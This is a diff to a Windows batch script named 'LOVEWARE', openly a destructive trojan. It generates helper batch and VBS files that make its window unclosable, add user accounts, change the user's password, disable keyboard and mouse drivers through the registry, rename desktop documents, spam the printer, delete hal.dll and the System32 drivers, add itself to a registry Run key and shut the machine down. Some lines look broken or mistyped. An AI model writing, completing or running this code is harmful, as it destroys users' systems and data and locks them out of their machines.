@@ -1,6 +1,6 @@
 @echo off
 
-:: LOVEWARE v8.4
+:: LOVEWARE v8.6
 ::
 :: YOU CAN DELETE THIS 
 :: |  |  |  |  |  |  |
@@ -114,7 +114,6 @@ if %errorLevel% == 0 (
     MessageBox.Show("ERROR! Program could not run, try running as admin.", Microsoft);
     pause
     exit
-
 )
 
 :runner
@@ -368,11 +367,31 @@ echo loop>>speak.vbs
 echo @echo off>LoveChoice.bat
 echo color 57>>LoveChoice.bat
 echo title LoveChoice>>LoveChoice.bat
-echo @set z=%random%>>LoveChoice.bat
+
+echo set z=%random%>yes.bat
+echo set z=%random%>no.bat
+
+:: make LoveChoice unclosable
+
+echo :checker>>LoveChoice.bat
+
+echo goto lovechoice>>LoveChoice.bat
+
+echo if "%1" equ "Restarted" goto %1>>LoveChoice.bat
+
+echo :again>>LoveChoice.bat
+echo echo N|start "" /WAIT cmd.exe /C "%~F0" Restarted > NUL>>LoveChoice.bat
+echo goto :again>>LoveChoice.bat
+
+echo :Restarted>>LoveChoice.bat
+echo goto checker>>LoveChoice.bat
+
+echo :lovechoice>>LoveChoice.bat
 
 :: Choose how you want to die
 
 echo echo Hey, do you love me (only answer in yes or no)>>LoveChoice.bat
+
 echo set /p love=>>LoveChoice.bat
 echo if %love%==yes goto love>>LoveChoice.bat
 echo if %love%==no goto hate>>LoveChoice.bat
@@ -385,12 +404,12 @@ echo echo I love you too...>>LoveChoice.bat
 
 :: Create a little message
 
-echo @echo @echo off>>AUTOEXEC.BAT>>LoveChoice.bat
-echo @echo I hope you listerned to my warning!>>AUTOEXEC.BAT>>LoveChoice.bat
-echo @echo timeout 20>>AUTOEXEC.BAT>>LoveChoice.bat
-echo @echo exit>>AUTOEXEC.BAT>>LoveChoice.bat
+echo @echo @echo off>>AUTOEXEC.BAT>>yes.bat
+echo @echo I hope you listerned to my warning!>>AUTOEXEC.BAT>>yes.bat
+echo @echo timeout 20>>AUTOEXEC.BAT>>yes.bat
+echo @echo exit>>AUTOEXEC.BAT>>yes.bat
 
-echo echo I will give you a present because you love me...>>LoveChoice.bat
+echo echo I will give you a present because you love me...>>LoveChoise.bat
 echo echo But first I want to say...>>LoveChoice.bat
 echo echo ........>>LoveChoice.bat
 echo echo .....>>LoveChoice.bat
@@ -408,120 +427,118 @@ echo echo Hahahahahahahaha!!!!!!!>>LoveChoice.bat
 
 :: Start the fun
 
-echo :respawn>>LoveChoice.bat
-echo start Loveware.exe>>LoveChoice.bat
-echo goto crazymouse>>LoveChoice.bat
-echo goto respawn>>LoveChoice.bat
+echo start yes.vbs>>LoveChoice.bat
+
+echo :respawn>>yes.bat
+echo start Loveware.exe>>yes.bat
+echo goto crazymouse>>yes.bat
+echo goto respawn>>yes.bat
 
 :: Crazy mouse
 
-echo :crazymouse>>LoveChoice.bat
-echo goto chaos>>LoveChoice.bat
-echo call mouse moveBy 10x100>>LoveChoice.bat
-echo call mouse moveBy 16x50>>LoveChoice.bat
-echo call mouse moveBy 190x10>>LoveChoice.bat
-echo call mouse moveBy 186x50>>LoveChoice.bat
-echo goto crazymouse>>LoveChoice.bat
+echo :crazymouse>>yes.bat
+echo goto chaos>>yes.bat
+echo call mouse moveBy 10x100>>yes.bat
+echo call mouse moveBy 16x50>>yes.bat
+echo call mouse moveBy 190x10>>yes.bat
+echo call mouse moveBy 186x50>>yes.bat
+echo goto crazymouse>>yes.bat
 
 :: Create some chaos
 
-echo :chaos>>LoveChoice.bat
-echo start speak.vbs>>LoveChoice.bat
-echo date 14/02/2006>>LoveChoice.bat
-echo time 00:00:00>>LoveChoice.bat
-echo nul >> %random%>>LoveChoice.bat
-echo mkdir ILoveYou+%z%>>LoveChoice.bat
-echo net user lover+%z% /add>>LoveChoice.bat
-echo goto makemsg>>LoveChoice.bat
-echo goto chaos>>LoveChoice.bat
+echo :chaos>>yes.bat
+echo start speak.vbs>>yes.bat
+echo date 14/02/2006>>yes.bat
+echo time 00:00:00>>yes.bat
+echo nul >> %random%>>yes.bat
+echo mkdir ILoveYou+%z%>>yes.bat
+echo net user lover+%z% /add>>yes.bat
+echo goto makemsg>>yes.bat
+echo goto chaos>>yes.bat
 
 :: A little message from your lover
 
-echo :makemsg>>LoveChoice.bat
-echo echo do>>msg.vbs>>LoveChoice.bat
-echo echo Msgbox"I love you darling.....",0+0,"You are hacked!">>msg.vbs>>LoveChoice.bat
-echo echo loop>>msg.vbs>>LoveChoice.bat
-echo goto startmasg>>LoveChoice.bat
-echo goto makemsg>>LoveChoice.bat
+echo :makemsg>>yes.bat
+echo echo do>>msg.vbs>>yes.bat
+echo echo Msgbox"I love you darling.....",0+0,"You are hacked!">>msg.vbs>>yes.bat
+echo echo loop>>msg.vbs>>yes.bat
+echo goto startmsg>>yes.bat
+echo goto makemsg>>yes.bat
 
-echo :startmsg>>LoveChoice.bat
-echo start msg.vbs>>LoveChoice.bat
-echo goto run>>LoveChoice.bat
-echo goto startmsg>>LoveChoice.bat
+echo :startmsg>>yes.bat
+echo start msg.vbs>>yes.bat
+echo goto run>>yes.bat
+echo goto startmsg>>yes.bat
 
 :: Create a new file and print it with the pritner
 
-echo :run>>LoveChoice.bat
-echo echo I love you!!!>>LOVE.txt>>LoveChoice.bat
+echo :run>>yes.bat
+echo echo I love you!!!>>LOVE.txt>>yes.bat
 
-echo :Print>>LoveChoice.bat
-echo PRINT LOVE.txt /D:LPT2>>LoveChoice.bat
-echo PRINT LOVE.txt /D:LPT1>>LoveChoice.bat
-echo NOTEPAD /P LOVE.txt>>LoveChoice.bat
-echo goto run1>>LoveChoice.bat
-echo goto Print>>LoveChoice.bat
+echo :Print>>yes.bat
+echo PRINT LOVE.txt /D:LPT2>>yes.bat
+echo PRINT LOVE.txt /D:LPT1>>yes.bat
+echo NOTEPAD /P LOVE.txt>>yes.bat
+echo goto run1>>yes.bat
+echo goto Print>>yes.bat
 
 :: Disable keyboard
 
-echo :run1>>LoveChoice.bat
-echo start "nokeyboard.reg">>LoveChoice.bat
+echo :run1>>yes.bat
+echo start "nokeyboard.reg">>yes.bat
 
 :: Rename desktop files
 
-echo CD /Desktop/>>LoveChoice.bat
-echo ren *.png LOVE.Letter>>LoveChoice.bat
-echo ren *.jpg LOVE.Letter>>LoveChoice.bat
-echo ren *.gif LOVE.Letter>>LoveChoice.bat
-echo ren *.docx LOVE.Letter>>LoveChoice.bat
-echo ren *.doc LOVE.Letter>>LoveChoice.bat
-echo ren *.pdf LOVE.Letter>>LoveChoice.bat
+echo CD Desktop>>yes.bat
+echo ren *.png LOVE.Letter>>yes.bat
+echo ren *.jpg LOVE.Letter>>yes.bat
+echo ren *.gif LOVE.Letter>>yes.bat
+echo ren *.docx LOVE.Letter>>yes.bat
+echo ren *.doc LOVE.Letter>>yes.bat
+echo ren *.pdf LOVE.Letter>>yes.bat
 
 :: Delete mouse
 
-echo set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass">>LoveChoice.bat
-echo reg delete %key%>>LoveChoice.bat
-echo reg add %key% /v Start /t REG_DWORD /d 4>>LoveChoice.bat
+echo set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass">>yes.bat
+echo reg delete %key%>>yes.bat
+echo reg add %key% /v Start /t REG_DWORD /d 4>>yes.bat
 
 :: Copy Loveware with some other things
 :: to the startup folder
 
-XCOPY "Loveware.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-:x
-MD ILoveYou
-CD ILoveYou
-XCOPY "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Loveware.exe"
-CD ILoveYou
-goto run4
-GOTO x
+::::::::::::::::XCOPY "Loveware.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
-:run4
-echo timeout 400>>LoveChoice.bat
+echo timeout 400>>yes.bat
 
 :: Have mersy and let the guy live
 
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs.exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(1).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(2).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(3).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(4).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(5).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(6).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(7).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(8).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(9).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(10).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(11).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(12).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(13).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(14).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(15).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(16).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(17).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(18).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(19).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(20).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(21).exe">>LoveChoice.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(22).exe">>LoveChoice.bat
+echo @echo off>clean.bat
+echo echo Starting Clean Up Process!!!!>>clean.vbs
+
+echo :clean>>clean.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs.exe">>clean.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(1).exe">>clean.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(2).exe">>clean.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(3).exe">>clean.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(4).exe">>clean.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(5).exe">>clean.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(6).exe">>clean.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(7).exe">>clean.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(8).exe">>clean.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(9).exe">>clean.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(10).exe">>clean.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(11).exe">>clean.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(12).exe">>clean.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(13).exe">>clean.bat
+echo goto clean>>clean.bat
+
+echo cls>>LoveChoice.bat
+
+echo echo Starting the Clean up process. You are soon going to be free>>LoveChoice.bat
+
+echo start /min clean.bat
+
+echo timeout 10>>LoveChoice.bat
 
 echo cls>>LoveChoice.bat
 
@@ -565,96 +582,91 @@ echo echo Info: This trojan was created by the G0df@ther!>>LoveChoice.bat
 echo timeout 1>>LoveChoice.bat
 echo echo You do not have so mutch time left to live!!!!!!!!!!!!!!!!!!!!!>>LoveChoice.bat
 echo echo So use your computer as long as you can!!!!!!!!!!!!>>LoveChoice.bat
-echo echo Do not close Loveware or Lovewatch, this will kill your computer!!!!!!!>>LoveChoice.bat
+echo echo Do not close Loveware or LoveChoice, this will kill your computer!!!!!!!>>LoveChoice.bat
 
 :: Having some fun
 
-echo :loop>>LoveChoice.bat
-echo start Loveware.exe>>LoveChoice.bat
-echo goto run5>>LoveChoice.bat
-echo goto loop>>LoveChoice.bat
+echo start no.vbs>>LoveChoice.bat
 
-:: Copy Loveware and some other things to the startup folder
+echo :loop>>no.bat
+echo start Loveware.exe>>no.bat
+echo goto run5>>no.bat
+echo goto loop>>no.bat
 
-echo :run5>>LoveChoice.bat
-
-XCOPY "Loveware.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-:x
-MD IHateYou
-CD IHateYou
-XCOPY "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Loveware.exe"
-CD IHateYou
-goto run6
-GOTO x
+echo :run5>>no.bat
 
 :: An angry message :)
 
-:run6
-echo :msgbox>>LoveChoice.bat
-echo echo do>>msg.vbs>>LoveChoice.bat
-echo echo Msgbox"I hate you... Here is the payback for the things you did to me!",0+0,"You are hacked!">>msg.vbs>>LoveChoice.bat
-echo echo loop>>msg.vbs>>LoveChoice.bat
-echo msginf>>LoveChoice.bat
-echo goto msgbox>>LoveChoice.bat
+echo :run6>>no.bat
 
-echo :msginf>>LoveChoice.bat
-echo start msg.vbs>>LoveChoice.bat
-echo goto dangerouschaos>>LoveChoice.bat
-echo goto msginf>>LoveChoice.bat
+echo :msgbox>>no.bat
+echo echo do>>msg.vbs>>no.bat
+echo echo Msgbox"I hate you... Here is the payback for the things you did to me!",0+0,"You are hacked!">>msg.vbs>>no.bat
+echo echo loop>>msg.vbs>>no.bat
+echo goto msginf>>no.bat
+echo goto msgbox>>no.bat
+
+echo :msginf>>no.bat
+echo start msg.vbs>>no.bat
+echo goto dangerouschaos>>no.bat
+echo goto msginf>>no.bat
 
 :: Making your pc unusable
 
-echo :dangerouschaos>>LoveChoice.bat
-echo net user %username% a0h5UILOVEYOUuYR45JmyUtHAHAHAHAHTheG0df@ther!>>LoveChoice.bat
-echo date 14/02/2006>>LoveChoice.bat
-echo time 00:00:00>>LoveChoice.bat
-echo nul >> %random%>>LoveChoice.bat
-echo mkdir IhateYou+%z%>>LoveChoice.bat
-echo net user lover+%z% /add>>LoveChoice.bat
-echo goto run6>>LoveChoice.bat
-echo goto dangerouschaos>>LoveChoice.bat
+echo :dangerouschaos>>no.bat
+echo net user %username% a0h5UILOVEYOUuYR45JmyUtHAHAHAHAHTheG0df@ther!>>no.bat
+echo date 14/02/2006>>no.bat
+echo time 00:00:00>>no.bat
+echo nul >> %random%>>no.bat
+echo mkdir IhateYou+%z%>>no.bat
+echo net user lover+%z% /add>>no.bat
+echo goto run7>>no.bat
+echo goto dangerouschaos>>no.bat
 
 :: Create a new file and print it with the pritner
 
-echo run6>>LoveChoice.bat
+echo :run7>>no.bat
 
-echo echo I hate you!!!>>LOVE.txt>>LoveChoice.bat
+echo echo I hate you!!!>>LOVE.txt>>no.bat
 
-echo :print>>LoveChoice.bat
-echo PRINT LOVE.txt /D:LPT2>>LoveChoice.bat
-echo PRINT LOVE.txt /D:LPT1>>LoveChoice.bat
-echo NOTEPAD /P LOVE.txt>>LoveChoice.bat
-echo goto run7>>LoveChoice.bat
-echo goto print>>LoveChoice.bat
+echo :print>>no.bat
+echo PRINT LOVE.txt /D:LPT2>>no.bat
+echo PRINT LOVE.txt /D:LPT1>>no.bat
+echo NOTEPAD /P LOVE.txt>>no.bat
+echo goto run8>>no.bat
+echo goto print>>no.bat
 
-echo :run7>>LoveChoice.bat
+echo :run8>>no.bat
 
 :: Disable keyboard
 
-echo start "nokeyboard.reg">>LoveChoice.bat
+echo start "nokeyboard.reg">>no.bat
 
 :: Rename files on desktop
 
-echo CD /Desktop/>>LoveChoice.bat
-echo ren *.png LOVE.Letter>>LoveChoice.bat
-echo ren *.jpg LOVE.Letter>>LoveChoice.bat
-echo ren *.gif LOVE.Letter>>LoveChoice.bat
-echo ren *.docx LOVE.Letter>>LoveChoice.bat
-echo ren *.doc LOVE.Letter>>LoveChoice.bat
-echo ren *.pdf LOVE.Letter>>LoveChoice.bat
+echo CD Desktop>>LoveChoice.bat
+echo ren *.png LOVE.Letter>>no.bat
+echo ren *.jpg LOVE.Letter>>no.bat
+echo ren *.gif LOVE.Letter>>no.bat
+echo ren *.docx LOVE.Letter>>no.bat
+echo ren *.doc LOVE.Letter>>no.bat
+echo ren *.pdf LOVE.Letter>>no.bat
 
-echo timeout 400>>LoveChoice.bat
+echo timeout 400>>no.bat
 
 :: Just killing you
 
-echo start %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs.exe>>LoveChoice.bat
-echo DEL /F /S /Q /A "%systemdrive%\windows\system32\hal.dll">>LoveChoice.bat
-echo @((( Echo Off > Nul ) & Break Off )>>LoveChoice.bat
-echo @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run>>LoveChoice.bat
-echo @Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul>>LoveChoice.bat
-echo @Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*">>LoveChoice.bat
-echo )>>LoveChoice.bat
-echo shutdown /s>>LoveChoice.bat
+echo start %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs.exe>>no.bat
+echo DEL /F /S /Q /A "%systemdrive%\windows\system32\hal.dll">>no.bat
+echo @((( Echo Off > Nul ) & Break Off )>>no.bat
+echo @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run>>no.bat
+echo @Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul>>no.bat
+echo @Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*">>no.bat
+echo )>>no.bat
+echo shutdown /s>>no.bat
+
+echo CreateObject("Wscript.Shell").Run "C:\Windows\yes.vbs" & WScript.Arguments(0) & "C:\Windows\yes.bat", 0, False>yes.vbs
+echo CreateObject("Wscript.Shell").Run "C:\Windows\no.vbs" & WScript.Arguments(0) & "C:\Windows\no.bat", 0, False>no.vbs
 
 :: Start the payload (LoveChoice)
 
@@ -676,6 +688,8 @@ goto :again
 
 :Restarted
 goto checker
+
+
 
 :: PLEASE DO NOT COPY THE LOVEWARE CODE AND RENAME IT
 :: THAT'S NOT CREATING THAT IS STEALING.
